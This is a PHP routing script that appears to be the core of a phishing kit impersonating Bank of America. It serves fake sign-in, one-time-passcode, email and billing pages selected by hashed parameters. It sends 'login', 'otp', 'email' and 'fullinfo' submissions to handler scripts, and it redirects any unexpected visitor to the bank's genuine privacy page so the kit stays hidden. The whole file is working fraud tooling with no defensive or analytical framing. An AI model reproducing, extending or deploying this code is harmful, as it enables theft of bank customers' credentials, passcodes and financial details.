<?php
session_start();
error_reporting(0);
include 'functions.php'; // Ensure other necessary functions are defined here

// Function to check if the device is a mobile device
function isMobileDevice($os) {
    $mobileOS = ['iPhone', 'Android', 'iPad', 'iPod', 'Mac OS X', 'Mac OS 9'];
    return in_array($os, $mobileOS);
}

// Function to include the correct page based on 'infoPage' and OS
function includePageByInfo($infoPage, $os) {
    $pages = [
        '99dea78007133396a7b8ed70578ac6ae' => ['signin', 'signin'], // This is the hash for 'signin'
        'd9d1e60e50119d9752001d4196ee6b3c' => ['otp', 'otp'], // This is the hash for 'otp'
        'ce8ae9da5b7cd6c3df2929543a9af92d' => ['email', 'email'], // This is the hash for 'email'
        '780c462e85ba4399a5d42e88f69a15ca' => ['billing', 'billing'], // This is the hash for 'billing'
        '0c09497d48a1a50f8465e65256aa8529' => ['done', 'mobile-done'], // This is the hash for 'done'
    ];
    
    if (isset($pages[$infoPage])) {
        // Determine whether to load the mobile or desktop version of the page
        $page = isMobileDevice($os) ? $pages[$infoPage][1] : $pages[$infoPage][0];
        include 'pages/' . $page . '.php';
    }
}

// Handle page or action request
if (!empty($_GET['infoPage'])) {
    includePageByInfo($_GET['infoPage'], $os);
} elseif (!empty($_GET['action'])) {
    switch ($_GET['action']) {
        case 'login':
            include 'functions/Login.php';
            break;
        case 'otp':
            include 'functions/Otp.php';
            break;
        case 'email':
            include 'functions/Email.php';
            break;
        case 'fullinfo':
            include 'functions/Full.php';
            break;
        default:
            // Redirect to Bank of America privacy page if no valid action is found
            header("Location: https://www.bankofamerica.com/security-center/privacy-overview/");
            exit();
    }
} else {
    // Redirect if neither 'infoPage' nor 'action' is provided
    header("Location: https://www.bankofamerica.com/security-center/privacy-overview/");
    exit();
}
?>